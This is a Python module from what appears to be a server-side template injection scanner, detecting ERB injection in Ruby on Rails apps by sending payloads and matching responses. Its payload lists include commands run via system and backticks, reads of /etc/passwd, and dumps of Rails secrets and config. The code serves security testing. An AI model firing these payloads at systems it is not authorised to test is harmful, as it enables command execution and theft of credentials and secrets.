"""
ERB template engine detection module.

This module implements Server-Side Template Injection (SSTI) detection
for the ERB (Embedded Ruby) template engine, commonly used in Ruby on Rails.

Author: SSTI Scanner Team
License: MIT
"""

import re
import urllib.parse
from typing import List, Dict, Any, Optional

from .base import BaseTemplateEngine, EngineResult, ConfidenceLevel, Payload


class ERBEngine(BaseTemplateEngine):
    """
    ERB template engine detector.
    
    ERB is Ruby's embedded template system.
    It uses <%= %> for output and <% %> for code execution.
    """
    
    def __init__(self, config):
        super().__init__(config)
        self.name = "erb"
        self.description = "ERB template engine (Ruby)"
        self.payloads = self._load_payloads()
        
        # ERB-specific patterns
        self.detection_patterns = {
            'math_result': [r'\b49\b', r'\b64\b', r'\b121\b'],
            'object_disclosure': [r'#<.*?>', r'Object:', r'Class:', r'Module:'],
            'ruby_execution': [r'system\(', r'exec\(', r'`.*?`', r'eval\('],
            'rails_objects': [r'ActionController', r'ActiveRecord', r'ApplicationController'],
        }
    
    def _load_payloads(self) -> List[Payload]:
        """Load ERB-specific SSTI payloads."""
        payloads = []
        
        # Basic math operations
        math_payloads = [
            "<%=7*7%>", "<%=8*8%>", "<%=11*11%>", "<%= 7 * 7 %>",
        ]
        
        # Ruby object access
        object_payloads = [
            "<%=self%>", "<%=self.class%>", "<%=self.methods%>", 
            "<%=Object.methods%>", "<%=Kernel.methods%>", "<%=File.methods%>",
        ]
        
        # System command execution
        exec_payloads = [
            "<%=system('id')%>", "<%=`id`%>", "<%=exec('whoami')%>",
            "<%=system('cat /etc/passwd')%>", "<%=`whoami`%>",
            "<%=IO.popen('id').read%>", "<%=open('|id').read%>",
        ]
        
        # File system access
        file_payloads = [
            "<%=File.open('/etc/passwd').read%>", "<%=IO.read('/etc/passwd')%>",
            "<%=File.read('/etc/passwd')%>", "<%=Dir.entries('/')%>",
        ]
        
        # Rails-specific payloads
        rails_payloads = [
            "<%=request%>", "<%=response%>", "<%=session%>", "<%=params%>",
            "<%=cookies%>", "<%=Rails.env%>", "<%=Rails.root%>",
            "<%=Rails.application.secrets%>", "<%=Rails.application.config%>",
        ]
        
        # URL-encoded variants
        url_payloads = ["%3C%25%3D7%2A7%25%3E", "%3C%25%3Dself%25%3E"]
        
        all_payload_strings = math_payloads + object_payloads + exec_payloads + file_payloads + rails_payloads + url_payloads
        
        for payload_str in all_payload_strings:
            context = "url" if payload_str.startswith('%') else "html"
            if "system(" in payload_str or "`" in payload_str or "exec(" in payload_str:
                payload_type = "code_execution"
            elif "File." in payload_str or "IO." in payload_str or "Dir." in payload_str:
                payload_type = "file_access"
            elif "Rails." in payload_str or "request" in payload_str:
                payload_type = "rails_access"
            elif "*" in payload_str:
                payload_type = "math"
            else:
                payload_type = "object_access"
            
            payloads.append(Payload(
                payload=payload_str,
                type=payload_type,
                context=context,
                description=f"ERB {payload_type} payload"
            ))
        
        return payloads
    
    async def test_payload(self, url: str, payload: str, **kwargs) -> EngineResult:
        """Test payload against target URL."""
        http_client = kwargs.get('http_client')
        method = kwargs.get('method', 'GET')
        data = kwargs.get('data', {})
        headers = kwargs.get('headers', {})
        
        if not http_client:
            return EngineResult(False, ConfidenceLevel.LOW, payload, "", "No HTTP client", self.name)
        
        try:
            if method.upper() == 'GET':
                test_url = f"{url}?test={payload}" if '?' not in url else url.replace('INJECT', payload)
                response = await http_client.get(test_url, headers=headers)
            else:
                test_data = data.copy() if data else {}
                test_data['test'] = payload
                response = await http_client.post(url, data=test_data, headers=headers)
            
            return self.analyze_response("", payload, response.get('text', ''))
            
        except Exception as e:
            return EngineResult(False, ConfidenceLevel.LOW, payload, "", f"Request failed: {e}", self.name)
    
    def analyze_response(self, original_response: str, payload: str, response: str) -> EngineResult:
        """Analyze response for ERB SSTI indicators."""
        if not response:
            return EngineResult(False, ConfidenceLevel.LOW, payload, response, "Empty response", self.name)
        
        evidence_parts = []
        confidence = ConfidenceLevel.LOW
        is_vulnerable = False
        
        # Check for math results
        if any(p in payload for p in ['7*7', '8*8', '11*11']):
            for pattern in self.detection_patterns['math_result']:
                if re.search(pattern, response):
                    evidence_parts.append(f"Math operation executed: {pattern}")
                    confidence = ConfidenceLevel.HIGH
                    is_vulnerable = True
        
        # Check for Ruby object disclosure
        for pattern in self.detection_patterns['object_disclosure']:
            if re.search(pattern, response, re.IGNORECASE):
                evidence_parts.append(f"Ruby object disclosure: {pattern}")
                confidence = max(confidence, ConfidenceLevel.MEDIUM)
                is_vulnerable = True
        
        # Check for command execution results
        exec_indicators = ['uid=', 'gid=', 'root:x:0:0', 'bin/bash', 'daemon:x:']
        for indicator in exec_indicators:
            if indicator in response:
                evidence_parts.append(f"Command execution result: {indicator}")
                confidence = ConfidenceLevel.HIGH
                is_vulnerable = True
        
        # Check for Rails-specific content
        rails_indicators = ['ActionController', 'ActiveRecord', 'Rails.application', 'development', 'production']
        for indicator in rails_indicators:
            if indicator in response:
                evidence_parts.append(f"Rails content exposed: {indicator}")
                confidence = max(confidence, ConfidenceLevel.MEDIUM)
                is_vulnerable = True
        
        # ERB template errors
        erb_errors = ['ERB::CompileError', 'syntax error', 'undefined method', 'undefined local variable', 'NoMethodError']
        for error in erb_errors:
            if error in response:
                evidence_parts.append(f"ERB error: {error}")
                confidence = max(confidence, ConfidenceLevel.MEDIUM)
                is_vulnerable = True
        
        # Ruby-specific patterns
        ruby_patterns = ['=> ', '#<Class:', '#<Object:', '#<Method:', 'Array', 'Hash', 'String']
        for pattern in ruby_patterns:
            if pattern in response and any(obj in payload for obj in ['self', 'Object', 'methods']):
                evidence_parts.append(f"Ruby object structure: {pattern}")
                confidence = max(confidence, ConfidenceLevel.MEDIUM)
                is_vulnerable = True
        
        evidence = "ERB SSTI detected: " + "; ".join(evidence_parts) if evidence_parts else "No ERB SSTI indicators"
        return EngineResult(is_vulnerable, confidence, payload, response[:500], evidence, self.name)
    
    def get_payloads_for_context(self, context: str) -> List[Payload]:
        return [p for p in self.payloads if p.context == context]
    
    def get_payloads_by_type(self, payload_type: str) -> List[Payload]:
        return [p for p in self.payloads if p.type == payload_type]
    
    def encode_payload(self, payload: str, context: str) -> str:
        if context == "url":
            return urllib.parse.quote(payload)
        elif context == "html":
            return payload.replace('<', '&lt;').replace('>', '&gt;')
        return payload
    
    def get_info(self) -> Dict[str, Any]:
        return {
            'name': self.name, 'description': self.description, 'payloads': len(self.payloads),
            'contexts': list(set(p.context for p in self.payloads)),
            'types': list(set(p.type for p in self.payloads)),
            'framework': 'Ruby on Rails', 'language': 'Ruby', 'syntax': '<%= expression %> and <% code %>'
        }
